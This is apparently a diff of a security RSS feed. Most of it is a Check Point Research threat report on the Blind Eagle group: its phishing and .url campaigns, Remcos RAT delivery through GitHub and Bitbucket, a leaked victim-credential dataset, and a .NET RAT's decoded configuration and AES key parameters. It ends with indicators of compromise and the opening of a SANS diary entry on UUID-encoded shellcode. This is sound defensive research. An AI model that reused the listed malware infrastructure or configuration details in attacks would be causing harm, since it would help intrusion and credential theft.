+&lt;figure class="aligncenter size-full"&gt;&lt;img alt="" class="wp-image-31219" height="417" src="https://research.checkpoint.com/wp-content/uploads/2025/03/img6.png" width="758" /&gt;&lt;figcaption class="wp-element-caption"&gt;&lt;strong&gt;Figure 8&lt;/strong&gt; &amp;#8211; &lt;code&gt;facturacioncol/fact&lt;/code&gt; Bitbucket repository.&lt;/figcaption&gt;&lt;/figure&gt;&lt;/div&gt;
+
+
+&lt;p&gt;The &lt;code&gt;PARAISO&lt;/code&gt; campaign was very successful, infecting more than &lt;strong&gt;1600&lt;/strong&gt; victims with &lt;strong&gt;Remcos RAT&lt;/strong&gt; and C&amp;amp;C &lt;code&gt;newstaticfreepoint24.ddns-ip.net:3020&lt;/code&gt;. The total infections across those campaigns, which occurred for over a week, were approximately &lt;strong&gt;9,000&lt;/strong&gt;.&lt;/p&gt;
+
+
+&lt;div class="wp-block-image"&gt;
+&lt;figure class="aligncenter size-full"&gt;&lt;img alt="" class="wp-image-31220" height="564" src="https://research.checkpoint.com/wp-content/uploads/2025/03/img7.png" width="830" /&gt;&lt;figcaption class="wp-element-caption"&gt;&lt;strong&gt;Figure 9&lt;/strong&gt; &amp;#8211; &lt;code&gt;trabajo12023/proyecto&lt;/code&gt; Bitbucket repository.&lt;/figcaption&gt;&lt;/figure&gt;&lt;/div&gt;
+
+
+&lt;h3 class="wp-block-heading"&gt;Blind Eagle &amp;#8211; .url Campaigns&lt;/h3&gt;
+
+
+
+&lt;p&gt;Since adding this file to its arsenal, &lt;strong&gt;Blind Eagle&lt;/strong&gt; consistently targeted &lt;strong&gt;Colombia&lt;/strong&gt;, primarily focusing on &lt;strong&gt;justice and other government organizations&lt;/strong&gt;. The group sent emails with malicious Google Drive links containing either an archive or the actual &lt;code&gt;.url&lt;/code&gt;. Those files triggered WebDAV requests on unpatched machines and, once clicked by the user, resulted in a WebDAV request that downloaded a &lt;strong&gt;HeartCrypt&lt;/strong&gt;-packed malware. This malware then extracted and injected a packed .NET loader into &lt;code&gt;csc.exe&lt;/code&gt;, which later loaded a .NET RAT which appears to be a variant of &lt;strong&gt;PureCrypter&lt;/strong&gt;. This .NET RAT decrypted its configuration, which contains execution parameters such as the C&amp;amp;C server and the campaign ID. After sending encrypted user data, the malware receives a URL to download the final stage payload, &lt;strong&gt;Remcos RAT&lt;/strong&gt;. Those final payloads were initially hosted on compromised servers and later on &lt;strong&gt;GitHub&lt;/strong&gt; or &lt;strong&gt;Bitbucket&lt;/strong&gt;.&lt;/p&gt;
+
+
+&lt;div class="wp-block-image"&gt;
+&lt;figure class="aligncenter size-large"&gt;&lt;img alt="" class="wp-image-31221" height="562" src="https://research.checkpoint.com/wp-content/uploads/2025/03/img8-1024x562.png" width="1024" /&gt;&lt;figcaption class="wp-element-caption"&gt;&lt;strong&gt;Figure 10&lt;/strong&gt; &amp;#8211; Blind Eagle November until February Campaigns.&lt;/figcaption&gt;&lt;/figure&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Throughout multiple campaigns, the group registered different domain names for its C&amp;amp;C servers, even though they were hosted on the same IP address. During campaigns such as &lt;code&gt;socialismo&lt;/code&gt;, the C&amp;amp;C of the .NET RAT was &lt;code&gt;republicadominica2025[.]ip-ddns[.]com&lt;/code&gt; and for the final stage &lt;code&gt;elyeso.ip-ddns[.]com&lt;/code&gt;, but both of them resolved to the same IP &lt;code&gt;177[.]255.85[.]101&lt;/code&gt;.&lt;/p&gt;
+
+
+
+&lt;h3 class="wp-block-heading"&gt;APT OPFail &amp;amp; Past Phishing Campaigns&lt;/h3&gt;
+
+
+
+&lt;p&gt;&lt;strong&gt;Check Point Research&lt;/strong&gt; was closely monitoring &lt;strong&gt;Blind Eagle&lt;/strong&gt; activities, we discovered an operation failure in which the group revealed its past phishing activities together with the victim&amp;#8217;s Personally Identifiable Information (&lt;strong&gt;PII&lt;/strong&gt;).&lt;/p&gt;
+
+
+
+&lt;p&gt;During January and February, the APT group delivered the last stage payload via files uploaded to the &lt;code&gt;Oscarito20222/file&lt;/code&gt; repository. The account &lt;code&gt;Oscarito20222&lt;/code&gt; also had another repository, which had only one commit from two years ago, &lt;code&gt;Oscarito20222/diciembre&lt;/code&gt;.&lt;/p&gt;
+
+
+
+&lt;p&gt;On February 25, 2025, this changed. The repository &lt;code&gt;diciembre&lt;/code&gt; received updates and also began delivering &lt;strong&gt;Remcos&lt;/strong&gt; during the next campaigns. To understand why this shift occurred, we had to examine the &lt;strong&gt;previous repository&lt;/strong&gt; responsible for delivering the final payload in the attack chain.&lt;/p&gt;
+
+
+
+&lt;p&gt;&lt;code&gt;Oscarito20222/file&lt;/code&gt; final commits:&lt;/p&gt;
+
+
+
+&lt;pre class="EnlighterJSRAW"&gt;==================================================
+[2025-02-25T14:01:33Z] Author: Oscarito20222    
+tree f03354f986a1398d1b471c0af75b404474cf94f7
+parent 9653938c6fd4b347209d87923f3617d70a3c12e2
+author Oscarito20222 &amp;lt;121189488+Oscarito20222@users.noreply.github.com&gt; 1740492093 -0500
+committer GitHub &amp;lt;noreply@github.com&gt; 1740492093 -0500
+
+Add files via upload
+ * Ver Datos del Formulario.html - e0837aebd649dba01bc4d594ef21a8086edaaeeb
+==================================================
+[2025-02-25T15:27:01Z] Author: Oscarito20222    
+tree 63a5c5307b93e0393aba14b42d7915ab7a2733ef
+parent 12eacb556eee889a16beb2fe9449748ebb4e33b0
+author Oscarito20222 &amp;lt;121189488+Oscarito20222@users.noreply.github.com&gt; 1740497221 -0500
+committer GitHub &amp;lt;noreply@github.com&gt; 1740497221 -0500
+
+Delete Ver Datos del Formulario.html
+&lt;/pre&gt;
+
+
+
+&lt;p&gt;For approximately &lt;strong&gt;1 hour and 27 minutes&lt;/strong&gt;, the group uploaded an HTML file named &lt;code&gt;Ver Datos del Formulario.html&lt;/code&gt;, which was later deleted. As of now, this remains the last recorded action in the repository, which occurred on &lt;strong&gt;February 25, 2025, at 15:27 UTC&lt;/strong&gt;.&lt;/p&gt;
+
+
+&lt;div class="wp-block-image"&gt;
+&lt;figure class="aligncenter size-full"&gt;&lt;img alt="" class="wp-image-31222" height="393" src="https://research.checkpoint.com/wp-content/uploads/2025/03/img9.png" width="840" /&gt;&lt;figcaption class="wp-element-caption"&gt;&lt;strong&gt;Figure 11&lt;/strong&gt; &amp;#8211; Last commits for the repository &lt;code&gt;Oscarito20222/file&lt;/code&gt;.&lt;/figcaption&gt;&lt;/figure&gt;&lt;/div&gt;
+
+
+&lt;p&gt;At this point, &lt;strong&gt;Blind Eagle&lt;/strong&gt; resumed its activity, using the repository &lt;code&gt;Oscarito20222/diciembre&lt;/code&gt;, with the first commit taking place at &lt;strong&gt;17:39 UTC the same day:&lt;/strong&gt;&lt;/p&gt;
+
+
+
+&lt;pre class="EnlighterJSRAW"&gt;==================================================
+[2022-12-21T17:31:25Z] Author: Oscarito20222    
+tree 67eb4f5d839ca89b28203a27ce3ca74029b93b7c
+author Oscarito20222 &amp;lt;121189488+Oscarito20222@users.noreply.github.com&gt; 1671643885 -0500
+committer GitHub &amp;lt;noreply@github.com&gt; 1671643885 -0500
+
+Add files via upload
+ * 2112-2.7z - 4e3cb251fb98a47c2f5dec5f3722723990c17a49
+==================================================
+[2025-02-25T17:39:17Z] Author: Oscarito20222    
+tree 1b6fc5c2150d598472f892a88305545626d977bd
+parent de2b332d06251e6449760ceead598a56da637daa
+author Oscarito20222 &amp;lt;121189488+Oscarito20222@users.noreply.github.com&gt; 1740505157 -0500
+committer GitHub &amp;lt;noreply@github.com&gt; 1740505157 -0500
+
+Add files via upload
+ * sena.exe - abf71fd332b760da29aa211f4aaa1661860a98c6
+==================================================
+[2025-02-25T17:39:29Z] Author: Oscarito20222    
+tree 3262538dbe881b34cfd71cedcb27e03688573f0e
+parent 408d7ef19b151668e2445532e06c6b3a569ebf98
+author Oscarito20222 &amp;lt;121189488+Oscarito20222@users.noreply.github.com&gt; 1740505169 -0500
+committer GitHub &amp;lt;noreply@github.com&gt; 1740505169 -0500
+
+Delete 2112-2.7z
+==================================================
+[2025-02-26T15:07:11Z] Author: Oscarito20222    
+tree d119d827561c0796c50deb8cf69f324811479e88
+parent d645bd6c880358d2bb4dfd83252ebbb6156c6b5c
+author Oscarito20222 &amp;lt;121189488+Oscarito20222@users.noreply.github.com&gt; 1740582431 -0500
+committer GitHub &amp;lt;noreply@github.com&gt; 1740582431 -0500
+
+Add files via upload
+ * TobaccoAnnouncement.exe - 44182ce5a8fadef41064d7c0266e8f99015262b0
+&lt;/pre&gt;
+
+
+
+&lt;p&gt;Opfail Timeline:&lt;/p&gt;
+
+
+
+&lt;ul class="wp-block-list"&gt;
+&lt;li&gt;&lt;strong&gt;2025-02-25 14:01 UTC&lt;/strong&gt;, Blind Eagle uploads to &lt;code&gt;Oscarito20222/file&lt;/code&gt; HTML PII data from phishing activities.&lt;/li&gt;
+
+
+
+&lt;li&gt;&lt;strong&gt;2025-02-25 15:27 UTC&lt;/strong&gt;, Deletes HTML file containing PII.&lt;/li&gt;
+
+
+
+&lt;li&gt;&lt;strong&gt;2025-02-25 17:39 UTC&lt;/strong&gt;, Uploads &lt;strong&gt;Remcos RAT&lt;/strong&gt; with C&amp;amp;C &lt;code&gt;21ene.ip-ddns[.]com&lt;/code&gt; to &lt;code&gt;Oscarito20222/diciembre&lt;/code&gt; repository&lt;/li&gt;
+
+
+
+&lt;li&gt;&lt;strong&gt;2025-02-25 17:39 UTC&lt;/strong&gt;, Deletes archive from &lt;code&gt;Oscarito20222/diciembre&lt;/code&gt; that was uploaded approximately two years ago.&lt;/li&gt;
+&lt;/ul&gt;
+
+
+
+&lt;p&gt;&lt;strong&gt;Check Point Research&lt;/strong&gt; obtained this HTML file, which was linked to phishing activities from early March 2024. The phishing domain &lt;code&gt;servicioseguroenlineabb[.]com&lt;/code&gt; appears to have impersonated Colombian Banks.&lt;/p&gt;
+
+
+
+&lt;p&gt;The PII data contains four fields:&lt;/p&gt;
+
+
+
+&lt;ol class="wp-block-list"&gt;
+&lt;li&gt;&lt;strong&gt;Nombre de Usuario,&lt;/strong&gt; Username&lt;/li&gt;
+
+
+
+&lt;li&gt;&lt;strong&gt;Contraseña Usuario,&lt;/strong&gt; User Password&lt;/li&gt;
+
+
+
+&lt;li&gt;&lt;strong&gt;Correo electrónico,&lt;/strong&gt; Email&lt;/li&gt;
+
+
+
+&lt;li&gt;&lt;strong&gt;Contraseña del correo,&lt;/strong&gt; Email Password&lt;/li&gt;
+
+
+
+&lt;li&gt;&lt;strong&gt;Clave Cajero,&lt;/strong&gt; ATM PIN&lt;/li&gt;
+&lt;/ol&gt;
+
+
+
+&lt;p&gt;The dataset (Referred to as: &lt;strong&gt;&amp;#8220;Datos del Formulario&amp;#8221;&lt;/strong&gt;) contained &lt;strong&gt;over 8,400 entries&lt;/strong&gt;, with &lt;strong&gt;8,075&lt;/strong&gt; valid after filtering out empty or insufficient records. These valid entries included &lt;strong&gt;account-password pairs&lt;/strong&gt; (username or email or all data filled), with &lt;strong&gt;1,634 email addresses&lt;/strong&gt; identified.&lt;/p&gt;
+
+
+
+&lt;p&gt;The phishing campaign specifically targeted &lt;strong&gt;Colombian users&lt;/strong&gt;. Among the collected email addresses:&lt;/p&gt;
+
+
+
+&lt;ul class="wp-block-list"&gt;
+&lt;li&gt;The majority were &lt;strong&gt;personal accounts&lt;/strong&gt; (Gmail, Yahoo, Hotmail, etc.).&lt;/li&gt;
+
+
+
+&lt;li&gt;&lt;strong&gt;Five&lt;/strong&gt; belonged to the &lt;strong&gt;Colombian government&lt;/strong&gt;.
+&lt;ul class="wp-block-list"&gt;
+&lt;li&gt;correo.policia.gov.co&lt;/li&gt;
+
+
+
+&lt;li&gt;sic.gov.co&lt;/li&gt;
+
+
+
+&lt;li&gt;contraloria.gov.co&lt;/li&gt;
+
+
+
+&lt;li&gt;adr.gov.co&lt;/li&gt;
+
+
+
+&lt;li&gt;dian.gov.co&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+
+
+
+&lt;li&gt;&lt;strong&gt;Fourteen&lt;/strong&gt; were associated with &lt;strong&gt;educational institutions&lt;/strong&gt;.&lt;/li&gt;
+
+
+
+&lt;li&gt;The remaining addresses belonged to &lt;strong&gt;businesses operating in Colombia&lt;/strong&gt;.&lt;/li&gt;
+&lt;/ul&gt;
+
+
+
+&lt;p style="line-height: 15%;"&gt;&lt;/p&gt;
+
+
+
+&lt;h2 class="wp-block-heading"&gt;.NET RAT &amp;#8211; “Remcos Downloader”&lt;/h2&gt;
+
+
+
+&lt;p&gt;The &lt;strong&gt;.NET RAT&lt;/strong&gt; delivered during the malware campaigns is protected with HeartCrypt, a &lt;a href="https://unit42.paloaltonetworks.com/packer-as-a-service-heartcrypt-malware/"&gt;Packer-as-a-Service&lt;/a&gt; (PaaS) that emerged in early 2024 to obfuscate malware and evade detection by security software. This packer embeds malicious code into otherwise legitimate binaries, with the packed payload stored as a resource. When executed, HeartCrypt first unpacks a simple .NET packer, which is injected into and triggered within &lt;code&gt;csc.exe&lt;/code&gt;.&lt;/p&gt;
+
+
+
+&lt;p&gt;This &lt;strong&gt;.NET packer&lt;/strong&gt; contains an embedded buffer that is:&lt;/p&gt;
+
+
+
+&lt;ol class="wp-block-list"&gt;
+&lt;li&gt;&lt;strong&gt;Decrypted using AES&lt;/strong&gt;&lt;/li&gt;
+
+
+
+&lt;li&gt;&lt;strong&gt;Decompressed with GZIP&lt;/strong&gt;&lt;/li&gt;
+
+
+
+&lt;li&gt;&lt;strong&gt;Loaded into memory&lt;/strong&gt; as a .NET RAT assembly&lt;/li&gt;
+&lt;/ol&gt;
+
+
+
+&lt;p&gt;In addition, the final executable (.NET RAT assembly) is obfuscated with &lt;strong&gt;NET-Reactor&lt;/strong&gt;, applying both &lt;strong&gt;string encryption&lt;/strong&gt; and &lt;strong&gt;control flow obfuscation&lt;/strong&gt; to further hinder analysis.&lt;/p&gt;
+
+
+&lt;div class="wp-block-image"&gt;
+&lt;figure class="aligncenter size-full"&gt;&lt;img alt="" class="wp-image-31223" height="468" src="https://research.checkpoint.com/wp-content/uploads/2025/03/img10.png" width="893" /&gt;&lt;figcaption class="wp-element-caption"&gt;&lt;strong&gt;Figure 12&lt;/strong&gt; &amp;#8211; .NET Packer, Unpacking process.&lt;/figcaption&gt;&lt;/figure&gt;&lt;/div&gt;
+
+
+&lt;p&gt;The majority of the strings are encrypted and stored inside a resource, which is immediately decrypted when execution begins. Then, each time a specific string is required, the malware requests it based on the index ID, where the index points to the &lt;strong&gt;DWORD&lt;/strong&gt; size of the string followed by the string content. The decrypted variable (containing the decrypted strings resource) follows the structure of how strings are stored in the &lt;code&gt;#US&lt;/code&gt; stream in .NET binaries. &lt;a href="https://github.com/SychicBoy/NETReactorSlayer"&gt;NETReactorSlayer&lt;/a&gt; (a well-known open-source deobfuscator for NET-Reactor-protected binaries) is able to decrypt those strings and deobfuscate such binaries.&lt;/p&gt;
+
+
+&lt;div class="wp-block-image"&gt;
+&lt;figure class="aligncenter size-large"&gt;&lt;img alt="" class="wp-image-31224" height="270" src="https://research.checkpoint.com/wp-content/uploads/2025/03/img11-1024x270.png" width="1024" /&gt;&lt;figcaption class="wp-element-caption"&gt;&lt;strong&gt;Figure 13&lt;/strong&gt; &amp;#8211; Function that retrieves String based on index ID.&lt;/figcaption&gt;&lt;/figure&gt;&lt;/div&gt;
+
+
+&lt;p&gt;The decrypted resource contains a base64 string, which is deserialized and contains the malware configuration along with the C&amp;amp;C.&lt;/p&gt;
+
+
+
+&lt;pre class="EnlighterJSRAW"&gt;CmIKIXJlcHVibGljYWRvbWluaWNhMjAyNS5pcC1kZG5zLmNvbRD56wEYBSIIbW9ubzEyMzQyCnNvY2lhbGlzbW9CElNwb25zb3JzaGlwVGltZW91dGINTmV4dEFjdGl2YXRvcg==
+{
+    "1": {
+        "1": "republicadominica2025[.]ip-ddns[.]com",
+        "2": 30201,
+        "3": 5,
+        "4": "mono1234",
+        "6": "socialismo",
+        "8": "SponsorshipTimeout",
+        "12": "NextActivator"
+    }
+}
+&lt;/pre&gt;
+
+
+
+&lt;p&gt;The malware collects information regarding the execution, machine, and user, then serializes them using &lt;strong&gt;protobuf&lt;/strong&gt; and encrypts them using AES. Data sent to the C&amp;amp;C:&lt;/p&gt;
+
+
+
+&lt;ul class="wp-block-list"&gt;
+&lt;li&gt;Bot ID&lt;/li&gt;
+
+
+
+&lt;li&gt;Campaign ID &lt;code&gt;socialismo&lt;/code&gt;&lt;/li&gt;
+
+
+
+&lt;li&gt;Username&lt;/li&gt;
+
+
+
+&lt;li&gt;OS Version&lt;/li&gt;
+
+
+
+&lt;li&gt;Malware version &lt;code&gt;0.3.9&lt;/code&gt;&lt;/li&gt;
+
+
+
+&lt;li&gt;Antivirus installed&lt;/li&gt;
+
+
+
+&lt;li&gt;Process Architecture&lt;/li&gt;
+
+
+
+&lt;li&gt;Process name&lt;/li&gt;
+
+
+
+&lt;li&gt;Machine specs …&lt;/li&gt;
+&lt;/ul&gt;
+
+
+
+&lt;p&gt;The malware attempts to retrieve IP addresses from the C&amp;amp;C domain name (&lt;code&gt;GetHostAddresses&lt;/code&gt;) and, if successful, sends the collected information.&lt;/p&gt;
+
+
+&lt;div class="wp-block-image"&gt;
+&lt;figure class="aligncenter size-full"&gt;&lt;img alt="" class="wp-image-31225" height="444" src="https://research.checkpoint.com/wp-content/uploads/2025/03/img12.png" width="1010" /&gt;&lt;figcaption class="wp-element-caption"&gt;&lt;strong&gt;Figure 14&lt;/strong&gt; &amp;#8211; GetHostAddresses with C&amp;amp;C.&lt;/figcaption&gt;&lt;/figure&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Data is serialized, and machine information is sent along with the malware campaign &lt;code&gt;socialismo&lt;/code&gt; and version &lt;code&gt;0.3.9&lt;/code&gt;.&lt;/p&gt;
+
+
+&lt;div class="wp-block-image"&gt;
+&lt;figure class="aligncenter size-full"&gt;&lt;img alt="" class="wp-image-31226" height="444" src="https://research.checkpoint.com/wp-content/uploads/2025/03/img13.png" width="1015" /&gt;&lt;figcaption class="wp-element-caption"&gt;&lt;strong&gt;Figure 15&lt;/strong&gt; &amp;#8211; Data Serialization.&lt;/figcaption&gt;&lt;/figure&gt;&lt;/div&gt;
+
+
+&lt;p&gt;The AES key used to encrypt and decrypt network communications is derived by calling &lt;code&gt;Rfc2898DeriveBytes&lt;/code&gt; using as a password the mutex name &lt;code&gt;mono1234&lt;/code&gt; and salt &lt;code&gt;{ 1, 2, 23, 234, 37, 48, 134, 63, 248, 4 }&lt;/code&gt;.&lt;/p&gt;
+
+
+&lt;div class="wp-block-image"&gt;
+&lt;figure class="aligncenter size-full"&gt;&lt;img alt="" class="wp-image-31227" height="256" src="https://research.checkpoint.com/wp-content/uploads/2025/03/img14.png" width="661" /&gt;&lt;figcaption class="wp-element-caption"&gt;&lt;strong&gt;Figure 16&lt;/strong&gt; &amp;#8211; AES Key generation.&lt;/figcaption&gt;&lt;/figure&gt;&lt;/div&gt;
+
+
+&lt;p&gt;A similar process then retrieves the response from the C&amp;amp;C server, which responds with a buffer containing the DWORD size followed by the AES encrypted buffer. At this moment, Blind Eagle has utilized this RAT as a downloader, receiving a URL with the file being downloaded and injected either into &lt;code&gt;MSBuild.exe&lt;/code&gt; or &lt;code&gt;InstallUtil.exe&lt;/code&gt;.&lt;/p&gt;
+
+
+&lt;div class="wp-block-image"&gt;
+&lt;figure class="aligncenter size-full"&gt;&lt;img alt="" class="wp-image-31228" height="416" src="https://research.checkpoint.com/wp-content/uploads/2025/03/img15.png" width="677" /&gt;&lt;figcaption class="wp-element-caption"&gt;&lt;strong&gt;Figure 17&lt;/strong&gt; &amp;#8211; Random choice of process to be injected.&lt;/figcaption&gt;&lt;/figure&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Even though &lt;strong&gt;Blind Eagle&lt;/strong&gt; uses this command the most, utilizing this .NET RAT as a simple downloader, the malware also contains other functionalities, such as downloading the next payload on disk, maintaining persistence via scheduled tasks, or even executing PowerShell scripts.&lt;/p&gt;
+
+
+&lt;div class="wp-block-image"&gt;
+&lt;figure class="aligncenter size-full"&gt;&lt;img alt="" class="wp-image-31229" height="398" src="https://research.checkpoint.com/wp-content/uploads/2025/03/img16.png" width="671" /&gt;&lt;figcaption class="wp-element-caption"&gt;&lt;strong&gt;Figure 18&lt;/strong&gt; &amp;#8211; Powershell file execution.&lt;/figcaption&gt;&lt;/figure&gt;&lt;/div&gt;
+
+
+&lt;h2 class="wp-block-heading"&gt;Conclusion&lt;/h2&gt;
+
+
+
+&lt;p&gt;Blind Eagle remains one of the most active and dangerous threat actors in Latin America, with a particular focus on Colombia’s public and private sectors. The group’s scale and persistence are evident, with over &lt;strong&gt;1,600&lt;/strong&gt; infections recorded from a single campaign. Long suspected of originating in Latin America, the confirmation of its &lt;strong&gt;UTC-5&lt;/strong&gt; operating timezone further narrows its likely base of operations to several &lt;strong&gt;South American&lt;/strong&gt; countries.&lt;/p&gt;
+
+
+
+&lt;p&gt;Despite Microsoft&amp;#8217;s release of a patch for &lt;strong&gt;CVE-2024-43451&lt;/strong&gt; on &lt;strong&gt;November 12, 2024&lt;/strong&gt;, Blind Eagle quickly adapted, introducing a variant of the “exploit” in just &lt;strong&gt;six days&lt;/strong&gt;. This rapid response highlights the group’s technical expertise, adaptability, and relentless pursuit of new attack methods. By incorporating malicious &lt;code&gt;.url&lt;/code&gt; files into its arsenal, Blind Eagle continues to refine its tactics, ensuring its malware distribution remains effective against evolving security defenses.&lt;/p&gt;
+
+
+
+&lt;p&gt;A key factor in its success is its ability to exploit legitimate file-sharing platforms, including &lt;strong&gt;Google Drive&lt;/strong&gt;, &lt;strong&gt;Dropbox&lt;/strong&gt;, &lt;strong&gt;Bitbucket&lt;/strong&gt;, and &lt;strong&gt;GitHub&lt;/strong&gt;, allowing it to bypass traditional security measures and distribute malware stealthily. Additionally, its use of underground crimeware tools such as &lt;strong&gt;Remcos RAT&lt;/strong&gt;, &lt;strong&gt;HeartCrypt&lt;/strong&gt;, and &lt;strong&gt;PureCrypter&lt;/strong&gt; reinforces its deep ties to the cybercriminal ecosystem, granting access to sophisticated evasion techniques and persistent access methods.&lt;/p&gt;
+
+
+
+&lt;p&gt;Blind Eagle’s rapid evolution, effective social engineering tactics, and focus on both public and private sector entities make it a critical cybersecurity threat. Mitigating its impact requires proactive threat intelligence, advanced security defenses, and continuous monitoring. Organizations must remain vigilant against phishing campaigns, file-based malware delivery, and unconventional attack techniques to stay ahead of this ever-adapting adversary.&lt;/p&gt;
+
+
+
+&lt;p style="line-height: 15%;"&gt;&lt;/p&gt;
+
+
+
+&lt;h2 class="wp-block-heading"&gt;Protections&lt;/h2&gt;
+
+
+
+&lt;p&gt;Check Point Threat Emulation and Harmony Endpoint provide comprehensive coverage of attack tactics, file types, and operating systems and protect against the attacks and threats described in this report.&lt;/p&gt;
+
+
+
+&lt;ul class="wp-block-list"&gt;
+&lt;li&gt;Exploit.Wins.CVE-2024-43451.ta.A&lt;/li&gt;
+
+
+
+&lt;li&gt;Infostealer.Win.Generic.F&lt;/li&gt;
+
+
+
+&lt;li&gt;Injector.Win.RunPE.A&lt;/li&gt;
+
+
+
+&lt;li&gt;Infostealer.Win.PasswordStealer.A&lt;/li&gt;
+
+
+
+&lt;li&gt;Trojan.Win.Unpacme.gl.I&lt;/li&gt;
+
+
+
+&lt;li&gt;Exploit.Win.UnDefender.A&lt;/li&gt;
+
+
+
+&lt;li&gt;Packer.Win.VBNetCrypter.H&lt;/li&gt;
+
+
+
+&lt;li&gt;Packer.Win.VBNetCrypter.E&lt;/li&gt;
+
+
+
+&lt;li&gt;Packer.Win.DotNetCrypter.G&lt;/li&gt;
+
+
+
+&lt;li&gt;Trojan.Win.Benjaminbo_test.gl.A&lt;/li&gt;
+
+
+
+&lt;li&gt;behavioral.win.suspautorun.a&lt;/li&gt;
+
+
+
+&lt;li&gt;behavioral.win.imagemodification.g&lt;/li&gt;
+&lt;/ul&gt;
+
+
+
+&lt;p style="line-height: 15%;"&gt;&lt;/p&gt;
+
+
+
+&lt;h2 class="wp-block-heading"&gt;Indicators of Compromise&lt;/h2&gt;
+
+
+
+&lt;figure class="wp-block-table"&gt;&lt;table class="has-fixed-layout"&gt;&lt;thead&gt;&lt;tr&gt;&lt;th&gt;Description&lt;/th&gt;&lt;th&gt;Value&lt;/th&gt;&lt;/tr&gt;&lt;/thead&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td&gt;Stage 1 &amp;#8211; ITW Endpoints&lt;/td&gt;&lt;td&gt;drive.usercontent[.]google[.]com/download?id=1CZcgN1kxz9kSNgscR9qgiOAERo-w-rTa&amp;amp;export=download&lt;br /&gt;drive.usercontent[.]google[.]com/download?id=1PZ2Ndi-GT-oQHlobFIdDJoSDSXkJvECV&amp;amp;export=download&lt;br /&gt;drive.usercontent[.]google[.]com/download?id=1R9MR64hy-dQelTZMPtsrSXLWObFt7mf2&amp;amp;export=download&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;Stage 1 &amp;#8211; .url&lt;/td&gt;&lt;td&gt;1d1e007a9d8939bee7a0333522cc4f7480d448cc&lt;br /&gt;133bc4304057317b0b93f5ff44f20d153b985b50&lt;br /&gt;1fcc44d3b20381acce66f5634743917e8f22dae7&lt;br /&gt;a0338654304b6f824bdc39bbb482a0e114f8a3a1&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;Stage 2 &amp;#8211; ITW Endpoints&lt;/td&gt;&lt;td&gt;62.60.226[.]64/file/1374_2790.exe&lt;br /&gt;62.60.226[.]64/file/3819_5987.exe&lt;br /&gt;62.60.226[.]64/file/4025_3980.exe&lt;br /&gt;62.60.226[.]64/file/9451_1380.exe&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;Stage 2 &amp;#8211; Payloads&lt;/td&gt;&lt;td&gt;07647f0eddf46d19e0864624b22236b2cdf561a1&lt;br /&gt;08daf84d9c2e9c51f64e076e7611601c29f68e90&lt;br /&gt;83c851f265f6d7dc9436890009822f0c2d4ba50a&lt;br /&gt;33ddaedc98991435f740f7a5a8a931a8cadd5391&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;State 2 &amp;#8211; C&amp;amp;C&lt;/td&gt;&lt;td&gt;republicadominica2025[.]ip-ddns[.]com&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;Stage 3 &amp;#8211; ITW Endpoint&lt;/td&gt;&lt;td&gt;raw.githubusercontent[.]com/Oscarito20222/file/refs/heads/main/redtube.exe&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;Stage 3 &amp;#8211; Remcos&lt;/td&gt;&lt;td&gt;758c73ab9706ae6977f9b4601c20b3667836d3ef&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;Stage 3 &amp;#8211; Remcos C&amp;amp;C&lt;/td&gt;&lt;td&gt;elyeso.ip-ddns[.]com:30204&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/figure&gt;
+
+
+
+&lt;p&gt;&lt;/p&gt;
+&lt;p&gt;The post &lt;a href="https://research.checkpoint.com/2025/blind-eagle-and-justice-for-all/"&gt;Blind Eagle: …And Justice for All&lt;/a&gt; appeared first on &lt;a href="https://research.checkpoint.com"&gt;Check Point Research&lt;/a&gt;.&lt;/p&gt;</content:encoded><guid isPermaLink="false">https://research.checkpoint.com/?p=31208</guid><category>Check Point Research Publications</category></item><item><title>Infocon: green</title><link>https://isc.sans.edu/diary.html?rss</link><description>Shellcode Encoded in UUIDs</description><guid isPermaLink="false">https://isc.sans.edu/diary.html?rss</guid></item><item><title>Shellcode Encoded in UUIDs, (Mon, Mar 10th)</title><link>https://isc.sans.edu/diary/rss/31752</link><description>&lt;p&gt;I returned from another FOR610&amp;#x5b;&lt;a href="https://www.sans.org/cyber-security-courses/reverse-engineering-malware-malware-analysis-tools-techniques/"&gt;1&lt;/a&gt;&amp;#x5d; class last week in London. One key tip I give to my students is to keep an eye on "strange" API calls. In the Windows ecosystem, Microsoft offers tons of API calls to developers. The fact that an API is used in a program does not always mean we are facing malicious code, but sometimes, some of them are derived from their official purpose. One of my hunting rules for malicious scripts is to search for occurrences of the ctypes&amp;#x5b;&lt;a href="https://docs.python.org/3/library/ctypes.html"&gt;2&lt;/a&gt;&amp;#x5d; library. It allows Python to call functions in DLLs or shared libraries.&lt;/p&gt;&amp;#xd;</description><content:encoded>&lt;p&gt;I returned from another FOR610[&lt;a href="https://www.sans.org/cyber-security-courses/reverse-engineering-malware-malware-analysis-tools-techniques/"&gt;1&lt;/a&gt;] class last week in London. One key tip I give to my students is to keep an eye on &amp;quot;strange&amp;quot; API calls. In the Windows ecosystem, Microsoft offers tons of API calls to developers. The fact that an API is used in a program does not always mean we are facing malicious code, but sometimes, some of them are derived from their official purpose. One of my hunting rules for malicious scripts is to search for occurrences of the ctypes[&lt;a href="https://docs.python.org/3/library/ctypes.html"&gt;2&lt;/a&gt;] library. It allows Python to&amp;nbsp;call functions in DLLs or shared libraries.&lt;/p&gt;
 
 &lt;p&gt;Example:&lt;/p&gt;
 
@@ -10179,22 +10951,24 @@ broadcast 203.0.113.255 dev lo proto kernel scope link src 203.0.113.0&lt;/code&
 &lt;/ul&gt;
 &lt;p&gt;These types of vulnerabilities are frequent attack vectors for malicious cyber actors and pose significant risks to the federal enterprise.&lt;/p&gt;
